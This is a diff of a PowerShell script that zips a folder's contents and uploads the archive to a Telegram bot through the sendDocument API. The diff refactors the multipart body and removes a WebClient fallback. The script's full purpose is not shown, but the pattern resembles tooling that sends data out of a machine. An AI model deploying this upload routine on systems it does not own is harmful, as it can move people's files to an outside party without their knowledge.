@@ -16,28 +16,11 @@ try {
     Compress-Archive "$t\*" $z -Force -ErrorAction Stop
     if(!(Test-Path $z -PathType Leaf)) { throw "Zip file $z not created" }
     $boundary="----Boundary$(Get-Random)"
-    $bodyLines=(
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"chat_id`"",
-        "",
-        "$c",
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $z -Leaf)`"",
-        "Content-Type: application/octet-stream",
-        "",
-        [System.IO.File]::ReadAllBytes($z)|ForEach-Object{[char]$_},
-        "--$boundary--"
-    )
-    $body=$bodyLines -join "`r`n"
+    $fileBytes=[System.IO.File]::ReadAllBytes($z)
+    $fileContent=$fileBytes|ForEach-Object{[char]$_} -ErrorAction Stop
+    $body=("--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$c`r`n--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $z -Leaf)`"`r`nContent-Type: application/octet-stream`r`n`r`n$fileContent`r`n--$boundary--")
     $uri="https://api.telegram.org/bot$b/sendDocument"
-    if($PSVersionTable.PSVersion.Major -ge 7) {
-        Invoke-RestMethod $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -ErrorAction Stop
-    } else {
-        $webClient=New-Object System.Net.WebClient
-        $webClient.Headers.Add("Content-Type","multipart/form-data; boundary=$boundary")
-        $webClient.UploadData($uri, [System.Text.Encoding]::UTF8.GetBytes($body))|Out-Null
-        $webClient.Dispose()
-    }
+    Invoke-RestMethod $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -ErrorAction Stop
 } catch {
     Write-Error "Error: $_"
     throw
